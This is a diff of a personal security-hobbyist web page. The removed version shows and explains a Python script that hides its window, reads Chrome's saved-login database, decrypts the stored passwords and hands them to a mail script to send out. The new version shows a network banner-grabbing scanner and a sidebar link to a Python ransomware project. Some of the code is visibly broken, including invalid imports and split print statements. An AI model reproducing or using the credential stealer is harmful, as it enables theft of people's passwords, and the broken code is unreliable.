@@ -1,116 +1,112 @@
 <!DOCTYPE html>
-<html lang="en" xmlns="http://www.w3.org/1999/html">
-	<head>
-		<title>Pylogin</title>
-		<link rel="icon" href="res/img/icon.png" />
-		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=0" />
-		<link rel="stylesheet" type="text/css" href="css/main.css" />
-		<link rel="stylesheet" media="screen and (max-width: 490px)" href="css/mobile.css" />
-		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atom-one-dark.min.css">
-		<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
-		<script>hljs.initHighlightingOnLoad();</script>
-	</head>
+<html lang="en" xmlns="http://www.w3.org/1999/html" xmlns="http://www.w3.org/1999/html">
+<head>
+    <title>Pylogin</title>
+    <link rel="icon" href="res/img/icon.png" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=0" />
+    <link rel="stylesheet" type="text/css" href="css/main.css" />
+    <link rel="stylesheet" media="screen and (max-width: 490px)" href="css/mobile.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atom-one-dark.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+    <script>hljs.initHighlightingOnLoad();</script>
+</head>
 
-	<body>
-		<div id="wrapper">
-			<section class="left me">
-				<!--TODO: work out how to relative links to work e.g. res/img/avatar.png -->
-				<img src="https://avatars2.githubusercontent.com/u/22042789?s=460&amp;v=4" width="230" alt="Luis Garcia" class="avatar" />
-				<article>
-					<h2><font size="4"> Luis Garcia Calzada</font></h2>
-					<h3>Information Security</h3>
-					<nav id="social">
-						<ul>
-							<li><a href="https://github.com/luisxciv"><img src="res/img/gh.svg" alt="My GitHub" /></a></li>
-							<li><a href="https://twitter.com/lusiboyz"><img src="res/img/tw.svg" alt="My Twitter" /></a></li>
+<body>
+<div id="wrapper">
+    <section class="left me">
+        <!--TODO: work out how to relative links to work e.g. res/img/avatar.png -->
+        <img src="https://avatars2.githubusercontent.com/u/22042789?s=460&amp;v=4" width="230" alt="Luis Garcia" class="avatar" />
+        <article>
+            <h2><font size="4"> Luis Garcia Calzada</font></h2>
+            <h3>Information Security</h3>
+            <nav id="social">
+                <ul>
+                    <li><a href="https://github.com/luisxciv"><img src="res/img/gh.svg" alt="My GitHub" /></a></li>
+                    <li><a href="https://twitter.com/lusiboyz"><img src="res/img/tw.svg" alt="My Twitter" /></a></li>
 
-						</ul>
-						<ul>Other projects:</ul>
-							<li><font size="3" color="#9370db"><a href="Syrans.html">Python Ransomware</a>
+                </ul>
+                <ul>Other projects:</ul>
+                <li><font size="3" color="#9370db"><a href="Syrans.html">Python Ransomware</a></font></li>
+                <li><font size="3" color="#9370db"><a href="sqlite3db.html">sqlite3-db grabber</a></font></li>
 
+            </nav>
+        </article>
+    </section>
+    <section class="right" id="content">
+        <article>
+            <h2 class="title"> pentestlib: <span>a python pentesting library</span></h2>
+            <pre>@author Luis Garcia</pre>
+            <p>The goal of this project is to create a library of pentesting scripts, everything built simple and completely built in python. You can find all of the scripts here in my Github
+            </p>
+            <h3>third-party libraries: <span>Some of the scripts require the use of third-party libraries, you can use  pip  to easily install modules. </span></h3>
 
-							</font> </li>
-					</nav>
-				</article>
-			</section>
-			<section class="right" id="content">
-				<article>
-					<pre>
+            <pre>
+
 						<code class="cpp">
-import sqlite3
-import win32crypt
-import os
-import win32console, win32gui
+import nmap
+import pydf
+import python-nmap
+import pygeoip
+import mechanize
+import BeautifulSoup4
+import python-bluez
+import bluetooth
+import python-obexftp</code>
+					</pre>
+            <br/>
+            <h3>banner-grabbing: </h3><span>The purpose of banner grabbing is to perform vulnerability analysis by obtaining information provided by the network host/ip aka 'banners'.  </span></h3>
+            <br></br>
+            <code class="cpp">
+                <font size="3" color="#00ff7f">
+                    <h4>  Usage: bannergrabber.py vulnerablebanners.txt  </h4>
+                </font>
+            </code>
+            <pre>
+						<code class="cpp">
+import socket
+import sys
 
-from os import getenv
+def retbanner(ip, port):
+    try:
+        socket.setdefaulttimeout(2)
+        s = socket.socket()
+        s.connect((ip, port))
+        banner = s.recv(2048)
+        return banner
+    except:
+        return
+def vulns(banner):
+    f = open('knownbanner.txt', 'r')
+    for line in f.readlines():
+        if line.strip('\n') in banner:
+            print
+            "Server is vulnerable" +banner.strip('/n')
+def main():
+    if len(sys.argv) == 2:
+        filename = sys.argv[1]
+        print
+        "reading vulnerabilities from" + filename
 
-window = win32console.GetConsoleWindow() #Comment this out if you dont want to hide the window
-win32gui.ShowWindow(window, 0)
-
-	conn = sqlite3.connect(getenv("APPDATA")+r"\..\Local\Google\Chrome\User Data\Default\Login Data") #Default dir
-	connection = conn.cursor()
-	conn.execute(" busy_timeout = 300000")
-	connection.execute('Select action_url, username_value, password_value FROM logins')
-
-myfile = open(r"Chromepass.txt", "a+")
-myfile.write("Chrome Saved Passwords\n")
-
-for result in cursor.fetchall():
-
-    password = win32crypt.CryptUnprotectData(result[2],None,None,None,0)[1]
-
-    if password:
-        fp.write('\nWebsite: '+result[0])
-        fp.write('\nUsername: '+result[1])
-        fp.write('\nPassword: ' + str(password))
-
-
-os.system('python sendmail.py')
+    Portlist = [21,22,80,443]
+    for x in range(1,255):
+        ip = '192.168.1.' + str(x)
+        for port in Portlist:
+            banner = retbanner(ip, port)
+            if banner:
+                print
+                '[+]' + ip + ":" + banner
+                vulns(banner)
+if __name__ == '__main__':
+    main()
 						</code>
 					</pre>
+            </br>
 
-					<h2 class="title"> Pylogin: <span>sqlite3-db grabber</span></h2>
-					<pre>@author Luis Garcia</pre>
-					<p>The purpose of this script is to extract confidential data from google chrome's sqlite3 db. The logins table contains the columns; origin_url, username_value and password_vale as seen visually in this image. </p>
-					<code class="cpp"> Don't use this for anything illegal, don't be an a hole"</code>
-
-						.<br/>
-
-					<img src="http://1.bp.blogspot.com/-89GEp5SDYhM/TcjvFVh8RcI/AAAAAAAABTs/8oXRE8NWCCg/s1600/Chrome+URLs+table+record.png" alt="img" />
-					<h3>Operation: <span>How does it work? </span></h3>
-					<code class="cpp">
-						<font size="2" color="#9370db">
-						conn = sqlite3.connect(getenv("APPDATA")+r"\..\Local\Google\Chrome\User Data\Default\Login Data")
-						</font>
-					</code>
-					<p>1. Using the sqlite 3 module we can connect to the database </p>
-					<code>
-						<font size="2" color="#9370db">
-							connection = conn.cursor()</font>
-					</code>
-					<p>2. Once we have a connection we can create a cursor object and call its execute() method to perform Sql commands </p>
-					<code>
-						<font size="2" color="#9370db">
-						conn.execute(" busy_timeout = 300000")
-						</font>
-					</code>
-					<p>3. We are not able to execute any SQL commands while the db file is in use so adding a busy timeout will allow the script to wait until the API stops using th sqlite3 db</p>
-					<code>
-						<font size="2" color="#9370db">
-							connection.execute('Select action_url, username_value, password_value FROM logins')</font></code>
-					<p>4. We can select the fields and the data will be passed on to the cursor() object we made 2 steps ago </p>
-					<code>
-						<font size="2" color="#9370db">
-							password = win32crypt.CryptUnprotectData(result[2],None,None,None,0)[1]
-						</font>
-					</code>
-						<p>Then by using a for loop such as <code>for result in cursor.fetchall()</code> we can use the win32crypt module to unprotect the data and write it to a txt file and call the sendmail.py script</p>
-					<br /><br />
-				</article>
+        </article>
 
 
-				<hr />
-			</section>
-		</div>
-	</body>
+        <hr />
+    </section>
+</div>
+</body>
 </html>
